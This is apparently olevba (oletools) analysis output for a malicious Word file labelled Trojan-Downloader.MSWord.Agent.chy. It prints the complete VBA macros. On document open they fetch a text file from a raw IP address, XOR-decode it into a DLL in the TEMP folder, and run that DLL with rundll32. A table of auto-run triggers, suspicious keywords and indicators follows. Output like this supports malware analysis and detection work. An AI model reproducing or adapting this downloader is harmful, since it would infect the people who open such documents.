olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Downloader.MSWord.Agent.chy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan-Downloader.MSWord.Agent.chy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

 Public Sub variable_caption(split_sEcho As String, languages_foo2 As String, nomnumber As Integer, nomnumber2 As Integer)
Dim cachingcore() As String, fldarr() As String, labelNamesubname As Long, removeID_tb As Integer, mode_val As String
Dim BIGGER_u30 As String
Dim iSortingCols_response() As Byte
Dim jabberlogout As Integer
Dim adress_subtitle As Byte
iSortingCols_response = StrConv(split_sEcho, vbFromUnicode)
BIGGER_u30 = StrConv(iSortingCols_response, vbUnicode)
cachingcore = Split(BIGGER_u30, vbCrLf)
If UBound(cachingcore) = 0 Then
    cachingcore = Split(BIGGER_u30, vbLf)
    If UBound(cachingcore) = 0 Then
        cachingcore = Split(BIGGER_u30, vbCr)
    End If
End If
Open languages_foo2 For Binary Lock Read Write As #2

For labelNamesubname = 0 To (UBound(cachingcore))

fldarr = Split(cachingcore(labelNamesubname), ",")
mode_val = fldarr(nomnumber)
If Len(mode_val) > 0 Then
adress_subtitle = Val(mode_val)
adress_subtitle = adress_subtitle Xor (106 + nomnumber2)
Put #2, , CByte(adress_subtitle)
End If


Next
Close #2
 End Sub
 

Public Sub ReadFromExcel()
Dim cachingcore() As String, fldarr() As String, labelNamesubname As Long, removeID_tb As Integer, mode_val As String
Dim emailsid As String

On Error Resume Next


Dim sortspecial As Integer, lstwords As Integer, notestep2 As Integer
Dim completed_bID As String


sortspecial = 1
notestep2 = 2
lstwords = 0
emailsid = "output.pdf"
Dim recovered_tb As Object

Set recovered_tb = CreateObject("InternetExplorer.Application")
With recovered_tb

.navigate ("http://109.94.209.91/12340.txt")
Do Until .readyState = 4
DoEvents
Loop
completed_bID = .Document.body.innerText
ChDir (Environ("TEMP"))
Call variable_caption(completed_bID, emailsid, lstwords, notestep2)

Dim fileextensionsline As String

fileextensionsline = "real3d.dll"

Call variable_caption(completed_bID, fileextensionsline, lstwords, sortspecial)




Module1.PtrSafe

Done:
Call variable_caption(completed_bID, fileextensionsline, lstwords, lstwords)

Module1.PtrSafe

CreateObject("WScript.Shell").Exec ("rundll32 " + fileextensionsline & ",DllMain")

.Quit
End With

End Sub
Private Sub Document_Close()


End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
UserForm1.Show
End Sub



-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: ./Trojan-Downloader.MSWord.Agent.chy - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 
Private Sub UserForm_Activate()
ThisDocument.ReadFromExcel

End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Trojan-Downloader.MSWord.Agent.chy - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare PtrSafe Function PtrSafe Lib "real3d" Alias _
"DllMain" () As Integer

-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Downloader.MSWord.Agent.chy' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma1
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN './Trojan-Downloader.MSWord.Agent.chy' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|output              |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://109.94.209.91|URL                                          |
|          |/12340.txt          |                                             |
|IOC       |109.94.209.91       |IPv4 address                                 |
|IOC       |real3d.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

